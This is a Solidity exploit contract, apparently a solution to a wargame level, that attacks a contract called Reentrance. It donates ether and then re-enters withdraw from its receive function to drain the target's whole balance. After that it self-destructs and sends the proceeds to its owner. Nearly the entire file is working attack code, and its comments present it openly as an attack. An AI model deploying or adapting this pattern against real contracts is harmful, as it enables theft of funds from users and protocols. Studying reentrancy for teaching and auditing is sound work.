// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

// Import the Re-entrancy Contract
import "./Reentrance.sol";

// Define the contract
contract ReentranceAttack {
    address public owner; // Address of the owner of this contract
    Reentrance public reentrance; // Instance of the Reentrance contract to be attacked

    // Constructor to initialize the contract with the Reentrance contract address
    constructor(address payable _instanceAddress) public {
        owner = msg.sender; // Set the owner as the deployer of this contract
        reentrance = Reentrance(_instanceAddress); // Set the Reentrance contract address
    }

    // Function to perform a reentrancy attack
    function attack() external payable {
        // Donate 1 Ether to the Reentrance contract from this contract
        reentrance.donate{value: 1e18}(address(this));

        // Withdraw 1 Ether from the Reentrance contract, triggering the reentrancy attack
        reentrance.withdraw(1e18);

        // Check if the Reentrance contract balance is now 0
        require(address(reentrance).balance == 0, "Target balance should be 0");

        // Self-destruct and transfer any remaining Ether to the owner
        selfdestruct(payable(owner));
    }

    // Function to deposit Ether into this contract
    function deposit() public payable {}

    // Receive function to handle incoming Ether
    receive() external payable {
        // Determine the amount to withdraw, capped at the Reentrance contract balance
        uint amount = min(1e18, address(reentrance).balance);

        // Check if the Reentrance contract has a balance greater than 0
        if (address(reentrance).balance > 0) {
            // Trigger reentrancy attack by calling the Reentrance contract's withdraw function
            reentrance.withdraw(amount);
        }
    }

    // Function to calculate the minimum of two values
    function min(uint x, uint y) private pure returns (uint) {
        return x <= y ? x : y;
    }
}
